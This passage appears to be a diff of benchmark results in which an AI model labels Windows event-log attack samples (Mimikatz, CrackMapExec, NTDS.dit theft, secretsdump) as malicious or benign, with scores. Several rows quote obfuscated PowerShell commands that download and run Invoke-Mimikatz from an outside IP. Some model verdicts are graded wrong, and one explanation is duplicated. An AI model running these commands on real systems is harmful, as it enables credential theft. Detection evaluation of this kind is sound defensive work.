,32,115,101,107,117 ,114,108 ,115 ,97 ,58 , 58 , 108, 111,103, 111,110, 112 ,97,115 , 115 ,119,111,114,100 , 115 , 101,120 ,105 , 116,39,10 , 36, 114,101 ,113 ,117 , 101, 115 , 116,32,61, 32 , 91 ,83 , 121 , 115,116 ,101, 109 , 46,78, 101,116, 46 ,87,101,98,82,101 , 113 ,117,101 , 115 ,116 ,93, 58 , 58 , 67,114 ,101, 97 , 116, 101 , 40 ,39 ,104,116 ,116 , 112 ,115, 58 , 47 , 47, 49,48 ,46, 50 , 51 , 46 ,49, 50 , 51, 46,49 ,49, 58 , 50,54 , 50,54 , 47 ,39, 41,10 ,36 ,114, 101, 113,117,101 ,115,116 , 46,77, 101,116,104 , 111 , 100 , 32 , 61, 32,39 , 80, 79 , 83,84,39 ,10 , 36 ,114 , 101, 113 , 117 , 101 ,115,116 , 46 ,67,111, 110 , 116, 101,110,116 ,84,121, 112, 101,32 , 61 , 32 ,39 ,97 ,112 ,112 ,108 , 105 , 99,97 , 116, 105 ,111 ,110, 47,120,45 , 119,119 , 119 ,45,102,111, 114 ,109 ,45,117, 114, 108 ,101 ,110 ,99 , 111,100 , 101 ,100 , 39,10,36,98,121, 116, 101, 115 , 32 , 61 ,32 , 91 , 83, 121 , 115, 116,101 , 109 , 46,84 ,101,120 ,116 , 46,69 , 110, 99 , 111 , 100 ,105 ,110 ,103,93 , 58 ,58, 65 , 83, 67, 73 , 73 , 46 ,71, 101 ,116 ,66 , 121 ,116,101 , 115 , 40 ,36 ,99 , 109 , 100, 41, 10, 36 , 114, 101, 113 , 117 ,101 ,115, 116, 46, 67 , 111, 110 ,116, 101,110 , 116 , 76,101,110,103,116 , 104 , 32,61 ,32, 36 ,98 ,121,116, 101 ,115 ,46,76, 101,110,103 ,116, 104,10, 36,114 , 101, 113 , 117 ,101, 115, 116,83,116 ,114 ,101,97, 109 , 32,61 , 32 ,36, 114,101 ,113 , 117 ,101 ,115 , 116,46 , 71, 101,116,82,101,113 ,117,101, 115 ,116 ,83, 116,114, 101,97, 109 , 40,41, 10, 36,114 , 101, 113, 117,101 ,115 , 116 , 83,116 ,114 , 101 , 97 ,109 , 46,87,114 ,105 ,116,101,40,36 , 98 , 121 ,116 , 101 ,115 ,44,32 ,48 ,44, 32, 36 ,98,121,116, 101 ,115 , 46,76 ,101,110 ,103,116, 104, 41 , 10 , 36,114,101,113 , 117,101 , 115, 116,83,116,114 , 101, 97 ,109 , 46,67, 108,111 ,115,101 , 40 ,41 , 10 , 36, 114 ,101, 113, 117,101 ,115 , 116 , 46,71 ,101, 116,82 ,101 , 115, 112 ,111 ,110,115,101, 40 ,41) | % { ( [ChaR][InT]$_) } ) +""$(sEt-iTeM  'vArIaBLE:ofS'  ' ' ) "" ) "", C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""
+- Network: 10.23.123.11
+- Registry: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB
+
+EXPLANATION:
+The logs show a PowerShell command executed with bypass flags that downloads a script named ""Invoke-Mimikatz.ps1"" from an external IP, indicating credential theft activity. Additionally, the execution of ""C:\tools\shell.cmd"" suggests the establishment of a persistent backdoor or remote access tool. The use of `SeTakeOwnershipPrivilege` and `SeSecurityPrivilege` further supports the intent to evade security controls and access sensitive system resources."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID325-327-IFM created - ESENT.evtx,easy,A,processed,YES,100.0,100.0,YES,"216, 325, 327",lsass,,,,,0.0,3.32,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 216, 325, 327
+- Processes: lsass
+- Accounts: None
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show the creation of Volume Shadow Copies (VSS) and the copying of the NTDS.dit database file to a suspicious directory path (`c:\hacker\Active Directory\ntds.dit`), which is a classic technique for stealing Active Directory credentials. The involvement of the `lsass` process and the specific file paths indicate an attempt to dump the domain controller's password hash database. This pattern of accessing and exfiltrating the NTDS.dit file via shadow copies is highly indicative of credential theft attacks."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID3-7-10-Suspicious DLL loaded (CME+Mimikatz).evtx,easy,A,processed,YES,100.0,100.0,YES,"7, 3, 10","powershell.exe, lsass.exe",OFFSEC\admmig,,"10.23.42.38, 10.23.123.11",,0.0,4.60,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 7, 7, 3, 10, 3
+- Processes: powershell.exe, lsass.exe
+- Accounts: OFFSEC\admmig
+- Commands: None
+- Network: 10.23.42.38, 10.23.123.11
+- Registry: None
+
+EXPLANATION:
+The logs show PowerShell (powershell.exe) loading the System.Management.Automation.dll and wmiutils.dll, followed by network connections to an external IP and, critically, a process access event (Event ID 10) where PowerShell accessed lsass.exe with high privileges (0x143A). This sequence indicates credential dumping or memory scraping via LSASS access, which is a definitive indicator of malicious activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4704-4705-User righ assigned to account.evtx,easy,A,processed,NO,100.0,100.0,YES,"4704, 4705",,admmig,,,,0.0,4.59,6.0,1.0,4.0,3,14.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4704, 4705
+- Processes: None
+- Accounts: admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show paired Event IDs 4704 (Privilege Assigned) and 4705 (Privilege Removed) for the same user account 'admmig' and identical privilege lists (e.g., SeCreateTokenPrivilege, SeDebugPrivilege). This pattern indicates that privileges were temporarily granted and then revoked, which is typical behavior for service accounts or scheduled tasks performing specific operations, rather than a persistent privilege escalation attack. There is no evidence of unauthorized access or persistent privilege retention."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4661-SAM sensitive domain users & groups discovery.evtx,easy,A,processed,NO,100.0,100.0,YES,4661,C:\Windows\System32\lsass.exe,admmig,,,,0.0,23.03,6.0,1.0,4.0,3,14.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4661
+- Processes: C:\Windows\System32\lsass.exe
+- Accounts: admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The events show the Local Security Authority Subsystem Service (lsass.exe) performing standard SAM object access checks for the account 'admmig'. This activity is consistent with normal authentication or authorization processes where the system validates user credentials and group memberships against the Security Account Manager. There are no indicators of compromise such as suspicious process injection, unusual network connections, or unauthorized privilege escalation commands."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID5140-ADMIN$ share connection with Golden ticket.evtx,easy,A,processed,YES,100.0,77.8,YES,5140,,"not_existing_user, admmig",,10.23.23.9,,0.0,2.70,4.7,6.0,4.0,3,17.7,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 5140, 5140
+- Processes: None
+- Accounts: not_existing_user, admmig
+- Commands: None
+- Network: 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The logs show two distinct accounts, including a non-existent user and a likely administrative account, accessing sensitive administrative shares (ADMIN$ and IPC$) from the same IP address within a short timeframe. This pattern of unauthorized or anomalous access to critical system shares from a single source suggests potential lateral movement or reconnaissance activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4732-4733-Quick added-removed user from local group.evtx,easy,A,processed,YES,100.0,100.0,YES,"4732, 4733",,"admmig, Users, Administrators, Backup Operators",,,,0.0,4.03,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4732, 4733
+- Processes: None
+- Accounts: admmig, Users, Administrators, Backup Operators
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show the account ""admmig"" adding a user to the ""Administrators"" and ""Backup Operators"" groups (Event ID 4732) and subsequently removing them (Event ID 4733) within a short timeframe. This pattern of rapidly granting and revoking high-privilege group memberships is a common technique used by attackers to maintain persistence or evade detection by hiding unauthorized access changes. The rapid sequence of privilege escalation and de-escalation by the same actor indicates suspicious activity rather than routine administrative maintenance."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID1-CrackMapExec payload execution.evtx,easy,B,processed,YES,80.0,75.0,NO,1,"cmd.exe, powershell.exe, WmiPrvSE.exe",OFFSEC\admmig,"cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" -JOIN('91A78H101@116f46G83@101S114H118@105k99T101@80S111k105T110k116T77,97@110T97S103A101H114A93S58k58,83@101A114@118k101@114G67,101T114S116S105@102,105,99G97@116A101S86A97A108H105@100G97H116@105A111,110@67T97T108k108S98@97f99T107@32@61S32k123T36@116G114H117G101f125S10,116f114,121A123A10A91k82S101S102T93f46,65@115H115H101S109H98H108,121,46f71@101@116T84f121G112@101T40@39,83k121f115S39,43G39A116@101,109k46,77T97A110@39A43f39f97S103H101k109T101G110G110S46k65@117A116A39k43@39S111f109k97@116@105f111T110f46@65S109A39T43,39@115,105f85G116@39G43G39T105@108@115@39T41,46A71S101H116S70@105@101A108T100S40f39k97A109@39H43G39T115T105,73T110S105S39@43@39f116f70H97@105@108A101@100T39@44@32H39@78S111f110G80@39A43@39H117H98k108G105H99S44@83@116T97T39G43S39S116A105@99,39H41H46T83S101S116k86T97A108,117H101@40f36,110A117k108A108@44k32@36@116f114T117@101G41G10,125,99f97H116A99@104H123f125,10H91T78T101f116k46A83f101S114f118S105,99,101A80k111f105G110f116f77S97A110k97@103T101,114@93S58k58T83H101H114G118,101@114@67G101@114A116@105G102H105k99G97S116T101@86S97f108k105k100H97G116S105,111k110k67k97T108@108,98S97@99@107A32H61,32,123@36H116f114k117,101k125@10,91@83f121k115S116@101@109S46H78G101A116S46@83S101A114T118T105@99H101@80H111G105f110,116f77H97f110S97@103,101f114H93A58f58A83@101k99@117G114,105@116@121@80S114A111,116A111f99k111k108@32@61@32H91k83T121,115@116f101H109T46@78@101@116T46G83k101,99f117@114k105k116@121f80H114T111A116f111G99G111@108A84S121H112G101@93G39A83A115k108H51@44,84T108G115k44k84T108A115T49A49@44@84G108@115@49S50@39@10S73k69T88G32f40@78A101@119@45f79,98H106@101S99k116k32G78,101A116@46@87@101k98G67S108G105,101@110G116G41G46@68S111@119f110H108H111,97@100@83H116@114H105@110@103k40H39A104A116H116A112S115A58G47f47S49H48T46A50H51,46k49H50H51k46H49k49H58H52A52f51f47@73@110S118f111@107k101G45S77@105T109@105,107,97,116H122H46k112A115k49T39@41T10T36S99@109T100S32,61S32f73H110H118H111T107,101@45H77@105f109,105@107k",,,16.7,43.12,4.5,5.0,3.3,0,12.8,C,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: cmd.exe, powershell.exe, WmiPrvSE.exe
+- Accounts: OFFSEC\admmig
+- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" -JOIN('91A78H101@116f46G83@101S114H118@105k99T101@80S111k105T110k116T77,97@110T97S103A101H114A93S58k58,83@101A114@118k101@114G67,101T114S116S105@102,105,99G97@116A101S86A97A108H105@100G97H116@105A111,110@67T97T108k108S98@97f99T107@32@61S32k123T36@116G114H117G101f125S10,116f114,121A123A10A91k82S101S102T93f46,65@115H115H101S109H98H108,121,46f71@101@116T84f121G112@101T40@39,83k121f115S39,43G39A116@101,109k46,77T97A110@39A43f39f97S103H101k109T101G110G110S46k65@117A116A39k43@39S111f109k97@116@105f111T110f46@65S109A39T43,39@115,105f85G116@39G43G39T105@108@115@39T41,46A71S101H116S70@105@101A108T100S40f39k97A109@39H43G39T115T105,73T110S105S39@43@39f116f70H97@105@108A101@100T39@44@32H39@78S111f110G80@39A43@39H117H98k108G105H99S44@83@116T97T39G43S39S116A105@99,39H41H46T83S101S116k86T97A108,117H101@40f36,110A117k108A108@44k32@36@116f114T117@101G41G10,125,99f97H116A99@104H123f125,10H91T78T101f116k46A83f101S114f118S105,99,101A80k111f105G110f116f77S97A110k97@103T101,114@93S58k58T83H101H114G118,101@114@67G101@114A116@105G102H105k99G97S116T101@86S97f108k105k100H97G116S105,111k110k67k97T108@108,98S97@99@107A32H61,32,123@36H116f114k117,101k125@10,91@83f121k115S116@101@109S46H78G101A116S46@83S101A114T118T105@99H101@80H111G105f110,116f77H97f110S97@103,101f114H93A58f58A83@101k99@117G114,105@116@121@80S114A111,116A111f99k111k108@32@61@32H91k83T121,115@116f101H109T46@78@101@116T46G83k101,99f117@114k105k116@121f80H114T111A116f111G99G111@108A84S121H112G101@93G39A83A115k108H51@44,84T108G115k44k84T108A115T49A49@44@84G108@115@49S50@39@10S73k69T88G32f40@78A101@119@45f79,98H106@101S99k116k32G78,101A116@46@87@101k98G67S108G105,101@110G116G41G46@68S111@119f110H108H111,97@100@83H116@114H105@110@103k40H39A104A116H116A112S115A58G47f47S49H48T46A50H51,46k49H50H51k46H49k49H58H52A52f51f47@73@110S118f111@107k101G45S77@105T109@105,107,97,116H122H46k112A115k49T39@41T10T36S99@109T100S32,61S32f73H110H118H111T107,101@45H77@105f109,105@107k"
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4656, 5145, 4674-Impacket secret dump via SMB.evtx",easy,A,processed,YES,100.0,85.0,YES,"1102, 4964, 4672, 4624, 5140, 5145, 4674, 4656, 4658","C:\Windows\System32\services.exe, C:\Windows\System32\lsass.exe","admmig, LOCAL SERVICE, FS03VULN$",,"10.23.23.9, 10.23.123.11",,0.0,19.04,5.1,5.0,4.0,3,17.1,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4964, 4672, 4624, 5140, 5145, 4674, 4656, 4658
+- Processes: C:\Windows\System32\services.exe, C:\Windows\System32\lsass.exe
+- Accounts: admmig, LOCAL SERVICE, FS03VULN$
+- Commands: None
+- Network: 10.23.23.9, 10.23.123.11
+- Registry: None
+
+EXPLANATION:
+The logs show the Security event log being cleared (Event ID 1102) by user 'admmig', followed immediately by multiple network logons (Event ID 4624) and high-privilege assignments (Event ID 4672) for the same user. The activity includes accessing sensitive shares like 'IPC$' and 'ADMIN$' to retrieve files such as 'Impacket secret dump.evtx' and 'SYSTEM32\BTeHLZkJ.tmp', which are strong indicators of credential dumping and anti-forensics techniques.
+
+EXPLANATION:
+The logs show the Security event log being cleared (Event ID 1102) by user 'admmig', followed immediately by multiple network logons (Event ID 4624) and high-privilege assignments (Event ID 4672) for the same user. The activity includes accessing sensitive shares like 'IPC$' and 'ADMIN$' to retrieve files such as 'Impacket secret dump.evtx' and 'SYSTEM32\BTeHLZkJ.tmp', which are strong indicators of credential dumping and anti-forensics techniques."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4688-5145-WMIexec execution via SMB.evtx,easy,A,error,NO,0.0,0.0,NO,,,,,,,,0.23,,,,,,,Error: HTTP 400
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID 4765 - SID history added.evtx,easy,A,processed,NO,100.0,66.7,YES,"4661, 4765, 4658",C:\Windows\System32\lsass.exe,"Administrator, Domain Admins, Andrei",,,,0.0,3.41,4.0,1.0,4.0,3,12.0,C,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4661, 4765, 4658
+- Processes: C:\Windows\System32\lsass.exe
+- Accounts: Administrator, Domain Admins, Andrei
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The events show the built-in Administrator account performing standard SAM database access and group membership modifications via lsass.exe, which is normal system behavior. There are no suspicious command lines, network connections, or unauthorized privilege escalations that would indicate malicious activity."
